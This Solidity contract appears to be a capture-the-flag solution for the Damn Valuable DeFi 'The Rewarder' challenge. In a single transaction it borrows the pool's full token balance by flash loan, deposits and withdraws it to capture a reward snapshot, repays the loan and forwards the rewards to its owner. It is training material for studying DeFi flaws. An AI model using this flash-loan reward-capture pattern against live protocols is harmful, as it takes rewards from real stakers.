// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";

contract AttackTheRewarder {
    DamnValuableToken internal damnvt;
    FlashLoanerPool internal flashLoanerPool;
    TheRewarderPool internal theRewarderPool;
    uint256 internal constant amount = 1000000e18;
    address internal owner;
    RewardToken internal rewardToken;

    constructor(address flp, address dvt, address rt, address trp) {
        owner = msg.sender;
        damnvt = DamnValuableToken(address(dvt));
        flashLoanerPool = FlashLoanerPool(address(flp));
        theRewarderPool = TheRewarderPool(address(trp));
        rewardToken = RewardToken(address(rt));
    }

    function receiveFlashLoan(uint256 amountSent) public {
        damnvt.approve(address(theRewarderPool), amountSent);
        theRewarderPool.deposit(amountSent);
        theRewarderPool.withdraw(amountSent);
        bool success = damnvt.transfer(address(flashLoanerPool), amountSent);
        require(success, "not paid the flashloan yet!");
        uint256 balance = rewardToken.balanceOf(address(this));
        bool status = rewardToken.transfer(address(owner), balance);
        require(status, "rewards not yet transferred to owner of the contract");
    }

    function getFlashLoan() public payable {
        flashLoanerPool.flashLoan(damnvt.balanceOf(address(flashLoanerPool)));
    }
}
